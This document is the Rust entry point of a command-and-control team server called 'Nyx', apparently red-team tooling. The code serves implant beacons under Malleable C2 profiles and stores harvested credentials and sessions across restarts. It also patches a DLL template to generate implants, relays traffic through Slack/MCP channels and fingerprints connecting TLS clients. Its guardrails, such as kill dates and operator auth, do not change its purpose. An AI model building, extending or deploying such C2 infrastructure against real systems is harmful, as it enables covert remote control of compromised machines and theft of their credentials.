use std::sync::Arc;

use nyx_protocol::ServerKeypair;
use nyx_server::{load_or_create_keypair, load_profile, load_script, router, AppState};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // rustls 0.23 no longer auto-selects a CryptoProvider at first use — even
    // with the `ring` feature enabled, if more than one provider is in the
    // dependency graph (e.g. aws-lc-rs pulled transitively) the first TLS op
    // panics with "Could not automatically determine the process-level
    // CryptoProvider". Install ring explicitly, early, before any TLS use.
    // No-op if a provider is already installed (e.g. by another crate).
    let _ = rustls::crypto::ring::default_provider().install_default();

    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "nyx_server=info,info".into()),
        )
        .init();

    // Load a Malleable C2 profile (lint-checked) if NYX_PROFILE is set. The
    // server then also serves the beacon endpoint at the profile's URIs.
    let profile = match std::env::var("NYX_PROFILE") {
        Ok(path) => {
            let p = load_profile(std::path::Path::new(&path))?;
            let get = p
                .http_get()
                .and_then(|b| b.get("uri"))
                .map(|u| u.as_str().into_owned());
            let post = p
                .http_post()
                .and_then(|b| b.get("uri"))
                .map(|u| u.as_str().into_owned());
            tracing::info!(?get, ?post, "loaded Malleable C2 profile");
            Some(p)
        }
        Err(_) => None,
    };

    // Guardrails: an optional API token (Bearer auth on /api/*) and a kill date.
    let mut api_token = std::env::var("NYX_TOKEN").ok().filter(|s| !s.is_empty());
    let killdate = std::env::var("NYX_KILLDATE")
        .ok()
        .and_then(|s| s.parse::<u64>().ok());
    if let Some(kd) = killdate {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(u64::MAX); // Err on the side of caution: kill-date active if clock is broken
        if now >= kd {
            anyhow::bail!("kill date {kd} has passed (now={now}); refusing to start");
        }
        tracing::info!(
            killdate = kd,
            "kill date active; server will stop serving after it"
        );
    }
    if api_token.is_some() {
        tracing::info!("control-API bearer-token guard enabled (NYX_TOKEN)");
    }

    let keypair = match std::env::var("NYX_KEYFILE") {
        Ok(p) => {
            let kp = load_or_create_keypair(std::path::Path::new(&p))?;
            tracing::info!(keyfile = %p, "persisted server identity loaded");
            kp
        }
        Err(_) => ServerKeypair::generate()
            .expect("server keypair generation: OsRng is infallible on supported targets"),
    };

    // Persistent credential store (Phase 2). Loads on every boot so creds
    // SURVIVE a server restart — unlike the in-memory sessions (which are lost
    // even with NYX_KEYFILE, since only the keypair persists, not the registry).
    // Path from NYX_CREDS, else ~/.nyx/server-creds.db.
    let creds_path = match std::env::var("NYX_CREDS") {
        Ok(p) => p,
        Err(_) => {
            let home = std::env::var("HOME")
                .or_else(|_| std::env::var("USERPROFILE"))
                .unwrap_or_else(|_| ".".to_string());
            std::path::PathBuf::from(&home)
                .join(".nyx")
                .join("server-creds.db")
                .to_string_lossy()
                .to_string()
        }
    };
    let cred_store = nyx_store::CredStore::open(std::path::Path::new(&creds_path))
        .map_err(|e| anyhow::anyhow!("failed to open cred store at {creds_path}: {e}"))?;
    tracing::info!(
        creds = %creds_path,
        restored = cred_store.count().unwrap_or(0),
        "credential store loaded"
    );

    // Phase 3: named-operator registry + action audit log.
    let data_dir = || -> std::path::PathBuf {
        let home = std::env::var("HOME")
            .or_else(|_| std::env::var("USERPROFILE"))
            .unwrap_or_else(|_| ".".to_string());
        std::path::PathBuf::from(&home).join(".nyx")
    };
    let operators_path = match std::env::var("NYX_OPERATORS_FILE") {
        Ok(p) => std::path::PathBuf::from(p),
        Err(_) => data_dir().join("operators.json"),
    };
    let audit_path = match std::env::var("NYX_AUDIT_LOG") {
        Ok(p) => std::path::PathBuf::from(p),
        Err(_) => data_dir().join("audit.jsonl"),
    };
    let operators = nyx_server::operators::OperatorRegistry::load_or_bootstrap(
        &operators_path,
        std::env::var("NYX_TOKEN").ok().as_deref(),
        std::env::var("NYX_BOOTSTRAP_OPERATOR").ok().as_deref(),
    )?;
    let audit_writer = nyx_server::audit::AuditWriter::open(&audit_path)?;
    tracing::info!(audit = %audit_path.display(), "action audit log opened");

    // Resolve the bind address up front (P0-2): default is loopback, NOT
    // 0.0.0.0, so a fresh `nyx-server` with no config is only reachable from
    // the local host. Binding the wider network requires an explicit
    // NYX_BIND=0.0.0.0:8443 — and that triggers the auth check below.
    let addr = std::env::var("NYX_BIND")
        .unwrap_or_else(|_| "127.0.0.1:8443".to_string())
        .trim()
        .to_string();

    // P0-2 (CRIT-1): a non-loopback bind with NO auth (empty operator registry
    // AND no NYX_TOKEN) is an OPEN team server on the network — anyone who can
    // reach it can task implants, read results, and pivot. Refuse that footgun
    // by auto-generating a strong random token (printed to stderr, mirroring the
    // server-pubkey pattern below) unless the operator explicitly opts into open
    // mode via NYX_ALLOW_OPEN=1 (CI/test — logged as a WARN).
    let is_network_bind = !nyx_server::is_loopback_bind(&addr);
    let no_auth = operators.is_open() && api_token.is_none();
    if is_network_bind && no_auth {
        if std::env::var("NYX_ALLOW_OPEN").as_deref() == Ok("1") {
            tracing::warn!(
                %addr,
                "non-loopback bind with NO auth (NYX_ALLOW_OPEN=1) — team server is OPEN; \
                 anyone who reaches it can task implants"
            );
        } else {
            let token = nyx_server::generate_api_token();
            eprintln!("╔═══════════════════════════════════════════════════════════════════╗");
            eprintln!("║ AUTO-GENERATED API TOKEN (control-API auth — save this!):          ║");
            eprintln!("║ {token} ║");
            eprintln!("║ Use: Authorization: Bearer {token:<55} (or set NYX_TOKEN)        ║");
            eprintln!("╚═══════════════════════════════════════════════════════════════════╝");
            tracing::info!("auto-generated control-API token for non-loopback bind");
            api_token = Some(token);
        }
    }

    // Kernel daemon bridge (P6): only wire up when NYX_KERNEL_DAEMON is set.
    // Without it the `/api/kernel/*` routes are dead code that returns
    // `{"ok":false,"err":"no daemon"}` for every call — misleading operators
    // into thinking a daemon is misconfigured when none is intended. When the
    // env var IS set (to the `host:port` of a running `nyx-kernel --serve`
    // daemon), construct the bridge and register the routes; otherwise leave
    // `kernel = None` and the router skips registering those routes entirely.
    let kernel = match std::env::var("NYX_KERNEL_DAEMON") {
        Ok(addr) => {
            let bridge =
                nyx_server::kernel::KernelBridge::new(nyx_server::kernel::KernelConfig { addr });
            tracing::info!("kernel daemon bridge enabled (NYX_KERNEL_DAEMON)");
            Some(Arc::new(bridge))
        }
        Err(_) => {
            tracing::info!(
                "kernel daemon bridge disabled (set NYX_KERNEL_DAEMON=<host:port> to enable \
                 /api/kernel/* routes)"
            );
            None
        }
    };

    // Implant generation: DLL template (pre-compiled by CI) for server-side
    // per-implant config patching. When NYX_TEMPLATE is set, the generation
    // endpoint is live. The template is read once at startup and kept in memory.
    let template = match std::env::var("NYX_TEMPLATE") {
        Ok(path) => {
            let bytes = std::fs::read(&path)
                .map_err(|e| anyhow::anyhow!("failed to read DLL template {path}: {e}"))?;
            // Validate PE structure (MZ + PE sig + minimum size) so a
            // corrupted/truncated file is caught at startup, not at generation.
            nyx_server::implant_gen::validate_template_pe(&bytes)
                .map_err(|e| anyhow::anyhow!("invalid DLL template {path}: {e}"))?;
            // Sanity: a real DLL is at least a few KiB (PE header + sections).
            if bytes.len() < 4096 {
                anyhow::bail!(
                    "DLL template {path} is too small ({len} bytes) — not a valid PE DLL",
                    len = bytes.len()
                );
            }
            // Verify the .nyx_cfg section exists (look for 0xAA*1024 pattern).
            let has_nyx_cfg = bytes.windows(8).any(|w| {
                w[0] == 0x41
                    && w[1] == 0x41
                    && w[2] == 0x41
                    && w[3] == 0x41
                    && w[4] == 0xAA
                    && w[5] == 0xAA
            });
            if !has_nyx_cfg {
                tracing::warn!(
                    "DLL template {path}: .nyx_cfg section with 0x41414141 magic + 0xAA padding not found; \
                     generation will fail at patch time"
                );
            }
            tracing::info!(template = %path, len = bytes.len(), "DLL template loaded for implant generation");
            Some(Arc::new(bytes))
        }
        Err(_) => {
            tracing::info!("NYX_TEMPLATE not set — implant generation endpoint disabled");
            None
        }
    };

    // Implant store: shares the same DB file as the cred store. We open a
    // separate connection (SQLite WAL handles concurrent access).
    let implant_store = match nyx_store::ImplantStore::open(std::path::Path::new(&creds_path)) {
        Ok(s) => {
            tracing::info!(db = %creds_path, "implant store opened");
            Some(Arc::new(s))
        }
        Err(e) => {
            tracing::warn!(error = %e, "failed to open implant store; implant generation disabled");
            None
        }
    };

    // Session-metadata store: shares the same DB file as the cred + implant
    // stores. Lets the session registry SURVIVE a team-server restart (previously
    // in-memory-only → every restart lost every active session). The in-memory
    // DashMap stays the primary read path; this store is the durability layer.
    // The persistence handle owns a dedicated background writer thread so the
    // hot beacon path is NEVER blocked on SQLite.
    let sessions_db = match nyx_store::SessionStore::open(std::path::Path::new(&creds_path)) {
        Ok(s) => {
            let store = Arc::new(s);
            let persist = nyx_server::SessionPersistence::spawn(store);
            tracing::info!(db = %creds_path, "session persistence enabled");
            Some(Arc::new(persist))
        }
        Err(e) => {
            tracing::warn!(
                error = %e,
                "failed to open session store; session persistence disabled \
                 (sessions will be in-memory-only and lost on restart)"
            );
            None
        }
    };

    // External-C2 relay config (Slack/MCP). Opt-in via NYX_EXTC2_* env vars;
    // absent → relay disabled and /extc2/* routes behave as plain beacon aliases.
    let extc2 = nyx_server::extc2_relay::ExtC2RelayConfig::from_env();
    if extc2.any_enabled() {
        tracing::info!(
            slack = extc2.slack.is_some(),
            mcp = extc2.mcp.is_some(),
            "external-C2 relay enabled (routes /extc2/slack and /extc2/mcp now \
             fan out to the real third-party API via nyx-transport)"
        );
    }

    let mut state = AppState {
        keypair,
        sessions: Default::default(),
        profile,
        api_token,
        killdate,
        events: nyx_scripting::EventBus::new(),
        fingerprints: Default::default(),
        creds: Arc::new(cred_store),
        operators: Arc::new(operators),
        audit: Some(Arc::new(audit_writer)),
        kernel,
        template,
        implant_rate_limiter: Default::default(),
        implants: implant_store,
        sessions_db,
        extc2,
    };
    state.register_default_hooks();
    // Optional operator automation: a Rhai script run on session/result events.
    if let Ok(p) = std::env::var("NYX_SCRIPT") {
        match load_script(std::path::Path::new(&p)) {
            Ok(hook) => {
                tracing::info!(script = %p, "loaded operator Rhai script");
                state.events.register(Box::new(hook));
            }
            Err(e) => {
                tracing::error!(error = %e, "failed to load NYX_SCRIPT; continuing without it")
            }
        }
    }
    let state = Arc::new(state);

    // Re-hydrate the session registry from the persistent store BEFORE the GC
    // starts (so the first sweep sees the restored sessions) and before beacons
    // arrive (so operators see the prior session list immediately). Restored
    // sessions are flagged `stale` until their first live check-in.
    let restored = nyx_server::load_persisted_sessions(&state);
    if restored > 0 {
        tracing::info!(restored, "session registry restored from persistent store");
    }

    // Start the background session garbage collector (age + idle eviction).
    nyx_server::spawn_session_gc(state.clone());

    let pubkey = hex::encode(state.keypair.public_bytes());

    let app = router(state.clone());
    // Port-in-use guard: a quick std bind-then-drop detects stale instances
    // before the real tokio listener. Gives a clear error instead of the
    // opaque "os error 10048".
    if let Err(e) = std::net::TcpListener::bind(addr.trim()) {
        anyhow::bail!(
            "port {addr} is already in use ({e}); stop the previous server instance first"
        );
    }

    let listener = tokio::net::TcpListener::bind(&addr).await?;

    // HTTPS (NYX_TLS): peek the ClientHello before rustls consumes the stream,
    // compute JA3/JA4, stash them keyed by peer addr (the beacon handler pops
    // them on check-in), then replay the bytes via PreambleStream so the TLS
    // handshake completes normally. When TLS is off, fall back to plaintext.
    match nyx_server::tls::build_acceptor()? {
        Some(acceptor) => {
            tracing::info!(%pubkey, %addr, scheme = "https", "Nyx team server listening (TLS); bake server_pub={pubkey} into implants");
            loop {
                let (stream, peer) = listener.accept().await?;
                let acc = acceptor.clone();
                let app = app.clone();
                let fps = state.fingerprints.clone();
                tokio::spawn(async move {
                    let timeout_dur = std::time::Duration::from_secs(30);
                    // Read the ClientHello (blocking, tiny) off the stream first.
                    let stream =
                        match tokio::time::timeout(timeout_dur, sniff_and_store(stream, peer, fps))
                            .await
                        {
                            Ok(Ok(s)) => s,
                            _ => {
                                tracing::debug!(%peer, "ClientHello sniff timed out or failed");
                                return;
                            }
                        };

                    match tokio::time::timeout(timeout_dur, acc.accept(stream)).await {
                        Ok(Ok(tls)) => {
                            let io = hyper_util::rt::TokioIo::new(tls);
                            let builder = hyper_util::server::conn::auto::Builder::new(
                                hyper_util::rt::TokioExecutor::new(),
                            );
                            // into_make_service_with_connect_info feeds
                            // ConnectInfo<SocketAddr> to the beacon handler
                            // so it can look up the fingerprint cache.
                            let make_svc = app
                                .clone()
                                .into_make_service_with_connect_info::<std::net::SocketAddr>();
                            // Manually drive the MakeService for this connection
                            // (axum::serve does this internally, but we handle
                            // the accept loop ourselves for TLS + fingerprinting).
                            // P0-11: never unwrap() — a single MakeService build
                            // failure must drop ONE connection, not panic the
                            // whole accept loop (which takes down every beacon).
                            match tower::ServiceExt::oneshot(make_svc, peer).await {
                                Ok(svc) => {
                                    let svc = hyper_util::service::TowerToHyperService::new(svc);
                                    let _ = builder.serve_connection(io, svc).await;
                                }
                                Err(e) => {
                                    tracing::warn!(%peer, error=%e, "make_service build failed; connection dropped")
                                }
                            }
                        }
                        _ => tracing::debug!(%peer, "TLS handshake timed out or failed"),
                    }
                });
            }
        }
        None => {
            tracing::info!(%pubkey, %addr, scheme = "http", "Nyx team server listening (plaintext); bake server_pub={pubkey} into implants");
            // into_make_service_with_connect_info feeds ConnectInfo<SocketAddr>
            // to the beacon handler so it can look up the fingerprint cache
            // (always empty on plaintext, but the extractor must still resolve).
            axum::serve(
                listener,
                app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
            )
            .await?;
        }
    }
    Ok(())
}

/// Peek the TLS ClientHello off a freshly-accepted TCP stream, compute JA3/JA4,
/// store them under `peer` in the fingerprint cache, and return a stream that
/// replays the consumed bytes in front of the rest of the connection.
async fn sniff_and_store(
    mut stream: tokio::net::TcpStream,
    peer: std::net::SocketAddr,
    fps: dashmap::DashMap<std::net::SocketAddr, nyx_server::Fingerprint>,
) -> std::io::Result<nyx_server::tls::PreambleStream<tokio::net::TcpStream>> {
    use tokio::io::AsyncReadExt;
    // Read the 5-byte TLS record header, then the record body. Use a small
    // fixed buffer; ClientHello records are well under 16 KiB.
    let mut header = [0u8; 5];
    stream.read_exact(&mut header).await?;
    if header[0] != 22 {
        // Not a TLS handshake — return the preamble (header bytes) and let the
        // TLS acceptor fail naturally. No fingerprint stored.
        return Ok(nyx_server::tls::PreambleStream::new(
            header.to_vec(),
            stream,
        ));
    }
    let rec_len = ((header[3] as usize) << 8) | header[4] as usize;
    if rec_len > 16384 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "ClientHello record size exceeds TLS maximum",
        ));
    }
    let mut payload = vec![0u8; rec_len];
    stream.read_exact(&mut payload).await?;

    let mut record = Vec::with_capacity(5 + payload.len());
    record.extend_from_slice(&header);
    record.extend_from_slice(&payload);

    // Compute JA3/JA4 from the captured record.
    let (ja3, ja4) = match nyx_transport::parse_client_hello(&record) {
        Ok(ch) => (Some(nyx_transport::ja3(&ch)), Some(nyx_transport::ja4(&ch))),
        Err(_) => (None, None),
    };
    if ja3.is_some() || ja4.is_some() {
        tracing::debug!(%peer, ja3 = ?ja3, ja4 = ?ja4, "captured inbound TLS fingerprint");
    }
    fps.insert(
        peer,
        nyx_server::Fingerprint {
            ja3,
            ja4,
            created: std::time::Instant::now(),
        },
    );
    Ok(nyx_server::tls::PreambleStream::new(record, stream))
}
